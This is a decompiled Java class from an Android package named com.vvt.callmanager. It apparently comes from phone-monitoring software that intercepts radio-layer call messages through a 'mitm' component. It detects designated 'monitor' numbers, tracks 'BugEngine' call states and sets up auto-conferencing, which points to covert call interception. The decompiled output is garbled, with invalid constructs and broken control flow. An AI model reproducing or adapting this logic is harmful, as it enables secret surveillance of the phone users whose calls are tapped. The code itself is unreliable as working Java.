package com.vvt.callmanager.filter;

import android.os.Parcel;
import com.vvt.callmanager.a.l;
import com.vvt.callmanager.a.m;
import com.vvt.callmanager.mitm.a;
import com.vvt.callmanager.ref.ActiveCallInfo;
import com.vvt.callmanager.ref.BugEngineCallState;
import com.vvt.callmanager.ref.MonitorNumber;
import com.vvt.callmanager.ref.f;
import java.util.ArrayList;

 enum FilterCdmaCall$CallState$3
{
  FilterCdmaCall$CallState$3()
  {
    super(paramString, paramInt, null);
  }
  
  public void onEnter(Object paramObject)
  {
    int i = 1;
    BugEngineCallState localBugEngineCallState = null;
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    FilterCdmaCall.a(this.mFilterCall, false);
    Object localObject1 = FilterCdmaCall.d(this.mFilterCall);
    if ((localObject1 != null) && (paramObject != null))
    {
      bool = paramObject instanceof com.vvt.callmanager.a.d;
      if (bool)
      {
        paramObject = (com.vvt.callmanager.a.d)paramObject;
        localObject1 = new com/vvt/callmanager/ref/ActiveCallInfo;
        ((ActiveCallInfo)localObject1).<init>();
        int j = ((com.vvt.callmanager.a.d)paramObject).b();
        if (j != i) {
          break label133;
        }
      }
    }
    for (;;)
    {
      ((ActiveCallInfo)localObject1).setIncoming(i);
      Object localObject2 = ((com.vvt.callmanager.a.d)paramObject).d();
      ((ActiveCallInfo)localObject1).setNumber((String)localObject2);
      localObject2 = FilterCdmaCall.d(this.mFilterCall);
      ((com.vvt.callmanager.mitm.d)localObject2).a((ActiveCallInfo)localObject1);
      localObject2 = this.mFilterCall;
      localBugEngineCallState = BugEngineCallState.CDMA_ONE_ACTIVE_CALL;
      FilterCdmaCall.a((FilterCdmaCall)localObject2, localBugEngineCallState);
      return;
      label133:
      i = 0;
      localObject2 = null;
    }
  }
  
  public Object onExit()
  {
    boolean bool = FilterCdmaCall.b();
    if (bool) {}
    return null;
  }
  
  public FilterCdmaCall.CallState processResponse(Parcel paramParcel)
  {
    int i = 1;
    float f1 = Float.MIN_VALUE;
    int j = 0;
    float f2 = 0.0F;
    Object localObject1 = null;
    Object localObject2 = FilterCdmaCall.a(this.mFilterCall);
    int k = ((m)localObject2).c(paramParcel);
    int i1 = 1025;
    Object localObject3;
    int m;
    Object localObject4;
    if (k == i1)
    {
      localObject2 = FilterCdmaCall.b(this.mFilterCall);
      localObject3 = i.a(paramParcel);
      localObject2 = ((f)localObject2).b((String)localObject3);
      if (localObject2 != null)
      {
        m = ((MonitorNumber)localObject2).isEnabled();
        if (m != 0)
        {
          m = i;
          if (m == 0) {
            break label150;
          }
          localObject4 = this.mFilterCall;
          localObject2 = "Found Monitor!";
          FilterCdmaCall.a((FilterCdmaCall)localObject4, (String)localObject2);
          localObject4 = this;
          label112:
          localObject1 = localObject4;
          i = j;
          f1 = f2;
        }
      }
    }
    for (;;)
    {
      if (i != 0)
      {
        localObject4 = this.mFilterCall;
        ((FilterCdmaCall)localObject4).c(paramParcel);
      }
      return (FilterCdmaCall.CallState)localObject1;
      m = 0;
      localObject2 = null;
      break;
      label150:
      localObject1 = MULTIPLE_CALLS;
      localObject4 = localObject1;
      j = i;
      f2 = f1;
      break label112;
      i1 = 9;
      int n;
      if (m == i1)
      {
        localObject2 = l.a(paramParcel);
        n = ((l)localObject2).b;
        int i2 = 134744072;
        if (n != i2) {}
        for (;;)
        {
          localObject1 = com.vvt.callmanager.a.d.a(paramParcel);
          localObject2 = "FilterCall";
          localObject3 = FilterCdmaCall.a(this.mFilterCall).a();
          i.a((String)localObject2, (ArrayList)localObject1, (a)localObject3);
          j = ((ArrayList)localObject1).size();
          if (j != 0) {
            break label377;
          }
          localObject1 = FilterCdmaCall.CallState.IDLE;
          break;
          i = 0;
          localObject4 = null;
          f1 = 0.0F;
        }
      }
      localObject3 = this.mFilterCall;
      boolean bool = FilterCdmaCall.e((FilterCdmaCall)localObject3);
      if (bool)
      {
        int i3 = 53;
        if (n == i3)
        {
          FilterCdmaCall.a(this.mFilterCall, false);
          localObject4 = AUTO_CONFERENCING;
          localObject2 = FilterCdmaCall.f(this.mFilterCall);
          localObject3 = this.mFilterCall;
          m localm = FilterCdmaCall.a(this.mFilterCall);
          i.a((String)localObject2, (n)localObject3, localm);
          localObject2 = this.mFilterCall;
          localObject3 = FilterCdmaCall.a(this.mFilterCall);
          i.a(false, (n)localObject2, (m)localObject3);
          localObject1 = localObject4;
          i = 0;
          localObject4 = null;
          f1 = 0.0F;
          continue;
        }
      }
      label377:
      localObject1 = this;
    }
  }
  
  public FilterCdmaCall.CallState processRilRequest(Parcel paramParcel)
  {
    Object localObject = FilterCdmaCall.a(this.mFilterCall);
    int i = ((m)localObject).b(paramParcel);
    int j = 84;
    if (i == j) {}
    for (localObject = MULTIPLE_CALLS;; localObject = this)
    {
      this.mFilterCall.d(paramParcel);
      return (FilterCdmaCall.CallState)localObject;
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/callmgr/classes-enjarify.jar!/com/vvt/callmanager/filter/FilterCdmaCall$CallState$3.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */